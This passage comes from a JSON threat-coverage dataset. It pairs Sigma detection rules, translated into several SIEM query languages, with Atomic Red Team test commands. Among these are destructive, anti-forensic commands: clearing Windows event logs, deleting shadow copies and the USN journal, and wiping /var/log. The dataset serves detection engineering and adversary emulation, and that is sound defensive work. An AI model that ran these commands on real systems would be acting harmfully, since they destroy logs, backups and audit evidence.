.*|.*.* C:\\\\Users\\\\\\\\.*\\\\.vbe .*|.*.* C:\\\\Users\\\\\\\\.*\\\\.js .*|.*.* C:\\\\Users\\\\\\\\.*\\\\.vba .*|.*.* C:\\\\Users\\\\\\\\.*\\\\.vbs .*|.*.* C:\\\\ProgramData\\\\\\\\.*\\\\.jse .*|.*.* C:\\\\ProgramData\\\\\\\\.*\\\\.vbe .*|.*.* C:\\\\ProgramData\\\\\\\\.*\\\\.js .*|.*.* C:\\\\ProgramData\\\\\\\\.*\\\\.vba .*|.*.* C:\\\\ProgramData\\\\\\\\.*\\\\.vbs .*))))(?=.*(?!.*(?:.*(?=.*.*\\\\winzip.*)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Windows Shell Spawning Suspicious Program\nid: 3a6586ad-127a-4d3b-a677-1e6eacdf8fde\nstatus: experimental\ndescription: Detects a suspicious child process of a Windows shell\nreferences:\n    - https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html\nauthor: Florian Roth\ndate: 2018/04/06\nmodified: 2019/02/05\ntags:\n    - attack.execution\n    - attack.defense_evasion\n    - attack.t1064\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage:\n            - '*\\mshta.exe'\n            - '*\\powershell.exe'\n            # - '*\\cmd.exe'  # too many false positives\n            - '*\\rundll32.exe'\n            - '*\\cscript.exe'\n            - '*\\wscript.exe'\n            - '*\\wmiprvse.exe'\n        Image:\n            - '*\\schtasks.exe'\n            - '*\\nslookup.exe'\n            - '*\\certutil.exe'\n            - '*\\bitsadmin.exe'\n            - '*\\mshta.exe'\n    falsepositives:\n        CurrentDirectory: '*\\ccmcache\\\\*'\n    condition: selection and not falsepositives\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative scripts\n    - Microsoft SCCM\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Windows Shell Spawning Suspicious Program\nid: 3a6586ad-127a-4d3b-a677-1e6eacdf8fde\nstatus: experimental\ndescription: Detects a suspicious child process of a Windows shell\nreferences:\n    - https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html\nauthor: Florian Roth\ndate: 2018/04/06\nmodified: 2019/02/05\ntags:\n    - attack.execution\n    - attack.defense_evasion\n    - attack.t1064\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage:\n            - '*\\mshta.exe'\n            - '*\\powershell.exe'\n            # - '*\\cmd.exe'  # too many false positives\n            - '*\\rundll32.exe'\n            - '*\\cscript.exe'\n            - '*\\wscript.exe'\n            - '*\\wmiprvse.exe'\n        Image:\n            - '*\\schtasks.exe'\n            - '*\\nslookup.exe'\n            - '*\\certutil.exe'\n            - '*\\bitsadmin.exe'\n            - '*\\mshta.exe'\n    falsepositives:\n        CurrentDirectory: '*\\ccmcache\\\\*'\n    condition: selection and not falsepositives\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative scripts\n    - Microsoft SCCM\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((ParentImage.keyword:(*\\\\\\\\mshta.exe OR *\\\\\\\\powershell.exe OR *\\\\\\\\rundll32.exe OR *\\\\\\\\cscript.exe OR *\\\\\\\\wscript.exe OR *\\\\\\\\wmiprvse.exe) AND Image.keyword:(*\\\\\\\\schtasks.exe OR *\\\\\\\\nslookup.exe OR *\\\\\\\\certutil.exe OR *\\\\\\\\bitsadmin.exe OR *\\\\\\\\mshta.exe)) AND (NOT (CurrentDirectory.keyword:*\\\\\\\\ccmcache\\\\\\\\*)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Windows-Shell-Spawning-Suspicious-Program <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Windows Shell Spawning Suspicious Program\",\\n    \"description\": \"Detects a suspicious child process of a Windows shell\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.defense_evasion\",\\n      \"attack.t1064\"\\n    ],\\n    \"query\": \"((ParentImage.keyword:(*\\\\\\\\\\\\\\\\mshta.exe OR *\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\rundll32.exe OR *\\\\\\\\\\\\\\\\cscript.exe OR *\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\wmiprvse.exe) AND Image.keyword:(*\\\\\\\\\\\\\\\\schtasks.exe OR *\\\\\\\\\\\\\\\\nslookup.exe OR *\\\\\\\\\\\\\\\\certutil.exe OR *\\\\\\\\\\\\\\\\bitsadmin.exe OR *\\\\\\\\\\\\\\\\mshta.exe)) AND (NOT (CurrentDirectory.keyword:*\\\\\\\\\\\\\\\\ccmcache\\\\\\\\\\\\\\\\*)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((ParentImage.keyword:(*\\\\\\\\\\\\\\\\mshta.exe OR *\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\rundll32.exe OR *\\\\\\\\\\\\\\\\cscript.exe OR *\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\wmiprvse.exe) AND Image.keyword:(*\\\\\\\\\\\\\\\\schtasks.exe OR *\\\\\\\\\\\\\\\\nslookup.exe OR *\\\\\\\\\\\\\\\\certutil.exe OR *\\\\\\\\\\\\\\\\bitsadmin.exe OR *\\\\\\\\\\\\\\\\mshta.exe)) AND (NOT (CurrentDirectory.keyword:*\\\\\\\\\\\\\\\\ccmcache\\\\\\\\\\\\\\\\*)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Windows Shell Spawning Suspicious Program\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((ParentImage.keyword:(*\\\\\\\\mshta.exe *\\\\\\\\powershell.exe *\\\\\\\\rundll32.exe *\\\\\\\\cscript.exe *\\\\\\\\wscript.exe *\\\\\\\\wmiprvse.exe) AND Image.keyword:(*\\\\\\\\schtasks.exe *\\\\\\\\nslookup.exe *\\\\\\\\certutil.exe *\\\\\\\\bitsadmin.exe *\\\\\\\\mshta.exe)) AND (NOT (CurrentDirectory.keyword:*\\\\\\\\ccmcache\\\\\\\\*)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((ParentImage=\"*\\\\\\\\mshta.exe\" OR ParentImage=\"*\\\\\\\\powershell.exe\" OR ParentImage=\"*\\\\\\\\rundll32.exe\" OR ParentImage=\"*\\\\\\\\cscript.exe\" OR ParentImage=\"*\\\\\\\\wscript.exe\" OR ParentImage=\"*\\\\\\\\wmiprvse.exe\") (Image=\"*\\\\\\\\schtasks.exe\" OR Image=\"*\\\\\\\\nslookup.exe\" OR Image=\"*\\\\\\\\certutil.exe\" OR Image=\"*\\\\\\\\bitsadmin.exe\" OR Image=\"*\\\\\\\\mshta.exe\")) NOT (CurrentDirectory=\"*\\\\\\\\ccmcache\\\\\\\\*\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (ParentImage IN [\"*\\\\\\\\mshta.exe\", \"*\\\\\\\\powershell.exe\", \"*\\\\\\\\rundll32.exe\", \"*\\\\\\\\cscript.exe\", \"*\\\\\\\\wscript.exe\", \"*\\\\\\\\wmiprvse.exe\"] Image IN [\"*\\\\\\\\schtasks.exe\", \"*\\\\\\\\nslookup.exe\", \"*\\\\\\\\certutil.exe\", \"*\\\\\\\\bitsadmin.exe\", \"*\\\\\\\\mshta.exe\"])  -(CurrentDirectory=\"*\\\\\\\\ccmcache\\\\\\\\*\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*(?:.*.*\\\\mshta\\\\.exe|.*.*\\\\powershell\\\\.exe|.*.*\\\\rundll32\\\\.exe|.*.*\\\\cscript\\\\.exe|.*.*\\\\wscript\\\\.exe|.*.*\\\\wmiprvse\\\\.exe))(?=.*(?:.*.*\\\\schtasks\\\\.exe|.*.*\\\\nslookup\\\\.exe|.*.*\\\\certutil\\\\.exe|.*.*\\\\bitsadmin\\\\.exe|.*.*\\\\mshta\\\\.exe))))(?=.*(?!.*(?:.*(?=.*.*\\\\ccmcache\\\\\\\\.*)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious RASdial Activity\nid: 6bba49bf-7f8c-47d6-a1bb-6b4dece4640e\ndescription: Detects suspicious process related to rasdial.exe\nstatus: experimental\nreferences:\n    - https://twitter.com/subTee/status/891298217907830785\nauthor: juju4\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1064\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - rasdial\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious RASdial Activity\nid: 6bba49bf-7f8c-47d6-a1bb-6b4dece4640e\ndescription: Detects suspicious process related to rasdial.exe\nstatus: experimental\nreferences:\n    - https://twitter.com/subTee/status/891298217907830785\nauthor: juju4\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1064\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - rasdial\n    condition: selection\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine:(\"rasdial\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-RASdial-Activity <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious RASdial Activity\",\\n    \"description\": \"Detects suspicious process related to rasdial.exe\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.execution\",\\n      \"attack.t1064\"\\n    ],\\n    \"query\": \"CommandLine:(\\\\\"rasdial\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine:(\\\\\"rasdial\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious RASdial Activity\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine:(\"rasdial\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"rasdial\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine IN [\"rasdial\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*rasdial)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: WSF/JSE/JS/VBA/VBE File Execution\nid: 1e33157c-53b1-41ad-bbcc-780b80b58288\nstatus: experimental\ndescription: Detects suspicious file execution by wscript and cscript\nauthor: Michael Haag\ntags:\n    - attack.execution\n    - attack.t1064\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*\\wscript.exe'\n            - '*\\cscript.exe'\n        CommandLine:\n            - '*.jse'\n            - '*.vbe'\n            - '*.js'\n            - '*.vba'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Will need to be tuned. I recommend adding the user profile path in CommandLine if it is getting too noisy.\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: WSF/JSE/JS/VBA/VBE File Execution\nid: 1e33157c-53b1-41ad-bbcc-780b80b58288\nstatus: experimental\ndescription: Detects suspicious file execution by wscript and cscript\nauthor: Michael Haag\ntags:\n    - attack.execution\n    - attack.t1064\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image:\n            - '*\\wscript.exe'\n            - '*\\cscript.exe'\n        CommandLine:\n            - '*.jse'\n            - '*.vbe'\n            - '*.js'\n            - '*.vba'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Will need to be tuned. I recommend adding the user profile path in CommandLine if it is getting too noisy.\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:(*\\\\\\\\wscript.exe OR *\\\\\\\\cscript.exe) AND CommandLine.keyword:(*.jse OR *.vbe OR *.js OR *.vba))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/WSF/JSE/JS/VBA/VBE-File-Execution <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"WSF/JSE/JS/VBA/VBE File Execution\",\\n    \"description\": \"Detects suspicious file execution by wscript and cscript\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1064\"\\n    ],\\n    \"query\": \"(Image.keyword:(*\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\cscript.exe) AND CommandLine.keyword:(*.jse OR *.vbe OR *.js OR *.vba))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:(*\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\cscript.exe) AND CommandLine.keyword:(*.jse OR *.vbe OR *.js OR *.vba))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'WSF/JSE/JS/VBA/VBE File Execution\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:(*\\\\\\\\wscript.exe *\\\\\\\\cscript.exe) AND CommandLine.keyword:(*.jse *.vbe *.js *.vba))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\wscript.exe\" OR Image=\"*\\\\\\\\cscript.exe\") (CommandLine=\"*.jse\" OR CommandLine=\"*.vbe\" OR CommandLine=\"*.js\" OR CommandLine=\"*.vba\")) | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image IN [\"*\\\\\\\\wscript.exe\", \"*\\\\\\\\cscript.exe\"] CommandLine IN [\"*.jse\", \"*.vbe\", \"*.js\", \"*.vba\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.*\\\\wscript\\\\.exe|.*.*\\\\cscript\\\\.exe))(?=.*(?:.*.*\\\\.jse|.*.*\\\\.vbe|.*.*\\\\.js|.*.*\\\\.vba)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: WMI Spawning Windows PowerShell\nid: 692f0bec-83ba-4d04-af7e-e884a96059b6\nstatus: experimental\ndescription: Detects WMI spawning PowerShell\nreferences:\n    - https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shell_spawn_susp_program.yml\n    - https://any.run/report/68bc255f9b0db6a0d30a8f2dadfbee3256acfe12497bf93943bc1eab0735e45e/a2385d6f-34f7-403c-90d3-b1f9d2a90a5e\nauthor: Markus Neis / @Karneades\ndate: 2019/04/03\ntags:\n    - attack.execution\n    - attack.defense_evasion\n    - attack.t1064\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage:\n            - '*\\wmiprvse.exe'\n        Image:\n            - '*\\powershell.exe'\n    condition: selection\nfalsepositives:\n    - AppvClient\n    - CCM\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: WMI Spawning Windows PowerShell\nid: 692f0bec-83ba-4d04-af7e-e884a96059b6\nstatus: experimental\ndescription: Detects WMI spawning PowerShell\nreferences:\n    - https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shell_spawn_susp_program.yml\n    - https://any.run/report/68bc255f9b0db6a0d30a8f2dadfbee3256acfe12497bf93943bc1eab0735e45e/a2385d6f-34f7-403c-90d3-b1f9d2a90a5e\nauthor: Markus Neis / @Karneades\ndate: 2019/04/03\ntags:\n    - attack.execution\n    - attack.defense_evasion\n    - attack.t1064\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage:\n            - '*\\wmiprvse.exe'\n        Image:\n            - '*\\powershell.exe'\n    condition: selection\nfalsepositives:\n    - AppvClient\n    - CCM\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(ParentImage.keyword:(*\\\\\\\\wmiprvse.exe) AND Image.keyword:(*\\\\\\\\powershell.exe))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/WMI-Spawning-Windows-PowerShell <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"WMI Spawning Windows PowerShell\",\\n    \"description\": \"Detects WMI spawning PowerShell\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.defense_evasion\",\\n      \"attack.t1064\"\\n    ],\\n    \"query\": \"(ParentImage.keyword:(*\\\\\\\\\\\\\\\\wmiprvse.exe) AND Image.keyword:(*\\\\\\\\\\\\\\\\powershell.exe))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(ParentImage.keyword:(*\\\\\\\\\\\\\\\\wmiprvse.exe) AND Image.keyword:(*\\\\\\\\\\\\\\\\powershell.exe))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'WMI Spawning Windows PowerShell\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(ParentImage.keyword:(*\\\\\\\\wmiprvse.exe) AND Image.keyword:(*\\\\\\\\powershell.exe))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((ParentImage=\"*\\\\\\\\wmiprvse.exe\") (Image=\"*\\\\\\\\powershell.exe\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ParentImage IN [\"*\\\\\\\\wmiprvse.exe\"] Image IN [\"*\\\\\\\\powershell.exe\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*.*\\\\wmiprvse\\\\.exe))(?=.*(?:.*.*\\\\powershell\\\\.exe)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "index=linux sourcetype=linux_audit syscall=59 OR syscall=322  | table host,syscall,syscall_name,exe,auid", "product": "Splunk", "name": null}, {"query": "This could be very overwhelming if whitelisting is not done.", "product": "Splunk", "name": null}], "possible_detections": [{"data_source": "auditlogs (audit.rules)"}], "attack_paths": []}, {"commands": [{"source": "atomics/T1065/T1065.yaml", "command": "test-netconnection -ComputerName google.com -port #{port}\n", "name": null}, {"source": "atomics/T1065/T1065.yaml", "command": "test-netconnection -ComputerName google.com -port 8081\n", "name": null}, {"source": "atomics/T1065/T1065.yaml", "command": "telnet google.com #{port}\n", "name": null}, {"source": "atomics/T1065/T1065.yaml", "command": "telnet google.com 8081\n", "name": null}], "command_list": ["test-netconnection -ComputerName google.com -port #{port}\n", "test-netconnection -ComputerName google.com -port 8081\n", "telnet google.com #{port}\n", "telnet google.com 8081\n"], "technique_id": "T1065", "parsed_datasets": [{"Atomic Red Team Test - Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls.": {"display_name": "Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls.", "atomic_tests": [{"description": "Testing uncommonly used port utilizing PowerShell\n", "supported_platforms": ["windows"], "name": "Testing usage of uncommonly used port with PowerShell", "input_arguments": {"domain": {"default": "google.com", "type": "String", "description": "Specify target hostname"}, "port": {"default": "8081", "type": "String", "description": "Specify uncommon port number"}}, "executor": {"elevation_required": false, "command": "test-netconnection -ComputerName #{domain} -port #{port}\n", "name": "powershell"}}, {"description": "Testing uncommonly used port utilizing telnet.\n", "supported_platforms": ["linux", "macos"], "name": "Testing usage of uncommonly used port", "input_arguments": {"domain": {"default": "google.com", "type": "String", "description": "Specify target hostname"}, "port": {"default": "8081", "type": "String", "description": "Specify uncommon port number"}}, "executor": {"elevation_required": false, "command": "telnet #{domain} #{port}\n", "name": "sh"}}], "attack_technique": "T1065"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1070/T1070.yaml", "command": "wevtutil cl System\n", "name": null}, {"source": "atomics/T1070/T1070.yaml", "command": "fsutil usn deletejournal /D C:\n", "name": null}, {"source": "atomics/T1070/T1070.yaml", "command": "rm -rf /private/var/log/system.log*\nrm -rf /private/var/audit/*\n", "name": null}, {"source": "atomics/T1070/T1070.yaml", "command": "echo 0> /var/spool/mail/root\n", "name": null}, {"source": "atomics/T1070/T1070.yaml", "command": "echo 0> /var/log/secure\n", "name": null}, {"source": "atomics/T1070/T1070.yaml", "command": "$eventLogId = Get-WmiObject -Class Win32_Service -Filter \"Name LIKE 'EventLog'\" | Select-Object -ExpandProperty ProcessId\nStop-Process -Id $eventLogId -Force\nRemove-Item C:\\Windows\\System32\\winevt\\Logs\\Security.evtx\n", "name": null}, {"source": "atomics/T1070/T1070.yaml", "command": "Clear-EventLog -logname Application\n", "name": null}, {"source": "data/abilities/defense-evasion/fcf71ee3-d1a9-4136-b919-9e5f6da43608.yml", "command": {"windows": {"psh,pwsh": {"command": "Clear-Eventlog Security;\nClear-Eventlog System;\n"}}}, "name": "Clear Sysmon logs [intended to trigger CAR-2016-04-002]"}, {"source": "Threat Hunting Tables", "command": "fsutil.exe usn deletejournal /D", "name": null}, {"source": "Threat Hunting Tables", "command": "vssadmin.exe delete shadows /all /quiet", "name": null}, {"source": "Threat Hunting Tables", "command": "wbadmin.exe delete catalog -quiet", "name": null}, {"source": "Threat Hunting Tables", "command": "wevtutil.exe /cl", "name": null}, {"source": "Threat Hunting Tables", "command": "wmic.exe /NODE:*shadowcopy delete *", "name": null}, {"source": "SysmonHunter - Indicator Removal on Host", "command": "clwevtutil", "name": null}, {"source": "SysmonHunter - Indicator Removal on Host", "command": "wevtutil|cl", "name": null}, {"source": "SysmonHunter - Indicator Removal on Host", "command": "fsutil|usn|deletejournal", "name": null}, {"source": "SysmonHunter - Indicator Removal on Host", "command": "usn|deletejournalfsutil", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/purge", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/credentials/mimikatz/purge", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/lock", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/lock", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/logoff", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/logoff", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/restart", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/restart", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/osx/RemoveDaemon", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/persistence/osx/RemoveDaemon", "name": "Empire Module Command"}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "rm -rf /var/log/*", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}], "command_list": ["wevtutil cl System\n", "fsutil usn deletejournal /D C:\n", "rm -rf /private/var/log/system.log*\nrm -rf /private/var/audit/*\n", "echo 0> /var/spool/mail/root\n", "echo 0> /var/log/secure\n", "$eventLogId = Get-WmiObject -Class Win32_Service -Filter \"Name LIKE 'EventLog'\" | Select-Object -ExpandProperty ProcessId\nStop-Process -Id $eventLogId -Force\nRemove-Item C:\\Windows\\System32\\winevt\\Logs\\Security.evtx\n", "Clear-EventLog -logname Application\n", {"windows": {"psh,pwsh": {"command": "Clear-Eventlog Security;\nClear-Eventlog System;\n"}}}, "fsutil.exe usn deletejournal /D", "vssadmin.exe delete shadows /all /quiet", "wbadmin.exe delete catalog -quiet", "wevtutil.exe /cl", "wmic.exe /NODE:*shadowcopy delete *", "clwevtutil", "wevtutil|cl", "fsutil|usn|deletejournal", "usn|deletejournalfsutil", "powershell/credentials/mimikatz/purge", "powershell/credentials/mimikatz/purge", "powershell/management/lock", "powershell/management/lock", "powershell/management/logoff", "powershell/management/logoff", "powershell/management/restart", "powershell/management/restart", "python/persistence/osx/RemoveDaemon", "python/persistence/osx/RemoveDaemon", "```", 